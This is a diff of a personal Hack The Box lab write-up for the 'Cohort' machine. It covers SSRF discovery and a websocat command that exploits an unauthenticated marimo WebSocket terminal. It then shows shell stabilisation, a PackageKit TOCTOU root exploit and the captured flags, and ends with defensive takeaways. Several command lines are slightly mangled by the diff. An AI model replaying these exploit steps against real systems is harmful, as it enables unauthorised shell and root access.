@@ -13,20 +13,201 @@ tags:
   - suid
   - mtu
   - ssl
-synced: "2026-10-16 12:38"
+synced: "2026-11-02 09:58"
 ---
 
-# Cohort - Hack The Box Writeup
+--
+tags:
+ciber
+htb
+machine
+difficulty: Easy
+os: Linux
+status: Pwned
+ip: "10.129.131.96"
+created: 2026-10-16
+--
+
+<p align="center">
+  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb351c-6269-49cd-8789-fc579a687c97-1781002999.png" alt="Cohort Avatar" width="220">
+</p>
+
+## Operating System: Linux
+![[Linux.png|70]]
+
+## Machine Metadata
+
+| Property | Value |
+| :--- | :--- |
+| **Machine ID** | 933 |
+| **Machine Name** | Cohort |
+| **IP Address** | 10.129.131.96 |
+| **Status** | Pwned |
+| **Active on HTB** | ✅ |
+| **User Flag** | ✅ |
+| **Root Flag** | ✅ |
+| **Difficulty** | Easy |
+| **Stars** | ⭐️ 3.8 |
+| **Created Note** | 2026-10-16 |
+| **Release Date** | 2026-08-01 |
+| **Tags** | None |
+
+<p style="display:none">
+id:: 933
+active:: True
+name:: Cohort
+os:: Linux
+user_flag:: True
+root_flag:: True
+difficulty_text:: Easy
+stars:: 3.8
+created:: 2026-10-16
+published:: 2026-08-01
+avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb351c-6269-49cd-8789-fc579a687c97-1781002999.png
+tags:: None
+</p>
+
+## Statistics
+
+### Radar Matrix
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Radar
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+item: "ENUM"
+    user: "user"
+    score: 5.8
+item: "REAL"
+    user: "user"
+    score: 5.4
+item: "CVE"
+    user: "user"
+    score: 6.7
+item: "CUSTOM"
+    user: "user"
+    score: 3.3
+item: "CTF"
+    user: "user"
+    score: 4.6
+item: "ENUM"
+    user: "author"
+    score: 0
+item: "REAL"
+    user: "author"
+    score: 0
+item: "CVE"
+    user: "author"
+    score: 0
+item: "CUSTOM"
+    user: "author"
+    score: 0
+item: "CTF"
+    user: "author"
+    score: 0
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "item"
+  yField: "score"
+  seriesField: "user"
+  meta:
+    score:
+      alias: "Score"
+      min: 0
+      nice: true
+  xAxis:
+    line: null
+    tickLine: null
+  yAxis:
+    label: false
+    grid:
+      alternateColor: "rgba(0, 0, 0, 0.04)"
+  point: []
+  area: []
+```
+
+### Community Difficulty Rating
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Column
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+folder: "PIECE OF CAKE"
+    count: 324
+folder: "VERY EASY"
+    count: 462
+folder: "EASY"
+    count: 1933
+folder: "NOT TOO EASY"
+    count: 1355
+folder: "MEDIUM"
+    count: 533
+folder: "A BIT HARD"
+    count: 160
+folder: "HARD"
+    count: 127
+folder: "EXTREMELY HARD"
+    count: 47
+folder: "INSANE"
+    count: 25
+folder: "BRAINFUCK"
+    count: 54
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "folder"
+  yField: "count"
+  padding: auto
+  label:
+    position: "middle"
+    style:
+      opacity: 0.6
+      fontSize: 12
+  columnStyle:
+    fillOpacity: 0.5
+    lineWidth: 1
+    strokeOpacity: 0.7
+    shadowColor: "grey"
+    shadowBlur: 10
+    shadowOffsetX: 5
+    shadowOffsetY: 5
+  xAxis:
+    label:
+      autoHide: false
+      autoRotate: true
+  meta:
+    count:
+      alias: "Votes"
+```
+
+--
+
+--
 
 ## Reconnaissance
 
-Before starting the enumeration, I encountered an issue where the TLS handshake initially hung indefinitely over the HTB VPN. This was an MTU/fragmentation issue on the `tun0` interface, which was resolved by lowering the MTU size:
+Before starting the enumeration, I encountered an issue where the [[Web - HTTP - HTTPS & SSL-TLS Handshake|TLS handshake]] initially hung indefinitely over the HTB VPN. This was an MTU/fragmentation issue on the `tun0` interface, which was resolved by lowering the MTU size:
 
 ```shell
 sudo ip link set tun0 mtu 1300
 ```
 
-With the VPN connection stable, I started with an Nmap scan to identify open ports and services:
+With the VPN connection stable, I started with an [[Recon - Nmap - Port Scanning and Host Discovery|Nmap scan]] to identify open ports and services:
 
 ```shell
 PORT    STATE SERVICE   VERSION
@@ -76,7 +257,7 @@ A directory fuzzing scan using feroxbuster confirmed several accessible endpoint
 200      GET        1l        4w       42c https://cohort.htb/api/health
 ```
 
-Further enumeration of the application functionality indicated a potential Server-Side Request Forgery (SSRF) vulnerability on the `/api/validate` endpoint. I used the following custom Python script to scan internal ports via the SSRF:
+Further enumeration of the application functionality indicated a potential [[Web - SSRF - Internal Port Scanning and Pivoting|Server-Side Request Forgery (SSRF)]] vulnerability on the `/api/validate` endpoint. I used the following custom Python script to scan internal ports via the SSRF:
 
 ```python
 # Custom script for internal port scanning via SSRF
@@ -132,13 +313,13 @@ Rendering the returned HTML in the browser yielded the following results:
 
 Through the newly discovered subdomain, I found an instance of **marimo**. This specific version of marimo (`< 0.23.0`) is vulnerable to a pre-authentication Remote Code Execution (RCE) vulnerability, tracked as **CVE-2026-39987**.
 
-The vulnerability exists because the `/terminal/ws` WebSocket endpoint does not call `validate_auth()` (unlike other endpoints such as `/ws`), making it possible to obtain a full PTY shell without supplying valid credentials.
+The vulnerability exists because the `/terminal/ws` WebSocket endpoint does not call `validate_auth()` (unlike other endpoints such as `/ws`), making it possible to obtain a full PTY shell without supplying valid credentials (see [[Web - Protocols - Unauthenticated WebSocket Terminal|Unauthenticated WebSocket Terminal Execution]]).
 
 I exploited this using `websocat` to connect to the unprotected WebSocket terminal:
 
 ```shell
 websocat "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
-  -H "Authorization: Bearer any-value" -k
+H "Authorization: Bearer any-value" -k
 ```
 
 Since the WebSocket connection was unstable and lacked proper job control or a complete PTY, I used it to establish a proper reverse shell.
@@ -161,7 +342,7 @@ Once the connection was caught by the listener, I stabilized the shell using Pyt
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-*(Note: If bracketed paste mode issues arise, inserting garbage characters like `^[[200~`, use `Ctrl+U` to clear the line without terminating the session.)*
+(Note: If bracketed paste mode issues arise, inserting garbage characters like `\x1b[200~`, use `Ctrl+U` to clear the line without terminating the session.)*
 
 ## Privilege Escalation
 
@@ -187,7 +368,7 @@ I downloaded and executed the exploit for CVE-2026-41651 on the target:
 ```shell
 ┌──(julicc㉿arceus)-[~/cohort.htb/exploits]
 └─$ rlwrap ./websocat.x86_64-unknown-linux-musl "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
-  -H "Authorization: Bearer any-value" -k
+H "Authorization: Bearer any-value" -k
 marimo@cohort:~$
 /tmp/exploit
 /tmp/exploit
@@ -209,8 +390,22 @@ cat /root/root.txt
 cat /root/root.txt   5e480f709ae70cb50c2b7d1c40e1b6a2  .suid_bash-5.2#
 ```
 
-The exploit successfully swapped the files during the race window, providing a SUID bash shell as the `root` user and allowing me to read the root flag.
+The exploit successfully swapped the files during the race window, providing a [[Linux - PrivEsc - SUID|SUID]] bash shell as the `root` user and allowing me to read the root flag.
 
 ## Conclusion
 
 Cohort was a very interesting machine that demonstrated the risks of SSRF leading to the discovery of internal endpoints. The initial foothold showcased a realistic pre-auth WebSocket vulnerability in `marimo`. Finally, the privilege escalation highlighted a classic TOCTOU race condition in `PackageKit`, emphasizing how package managers can be abused to gain root access if they are not handling file checks securely.
+
+--
+
+## Post-Engagement & Zettelkasten Notes
+
+### Key Takeaways & Defense
+**Pre-Auth WebSocket Protection**: Avoid exposing dev tools and notebooks (`marimo`) without robust token validation and origin checks.
+**PackageKit TOCTOU Race Condition (CVE-2026-41651)**: System package managers pinned to vulnerable versions allow local unprivileged users to win file-swapping race conditions and spawn SUID binaries.
+
+### Atomic Notes to Extract
+[[Web - Protocols - Unauthenticated WebSocket Terminal|Unauthenticated WebSocket Terminal Execution]]
+[[Web - SSRF - Internal Port Scanning and Pivoting|Server-Side Request Forgery (SSRF)]]
+[[Linux - PrivEsc - TOCTOU Race Conditions|TOCTOU Race Condition Exploitation]]
+[[Linux - PrivEsc - SUID|SUID Privilege Escalation]]
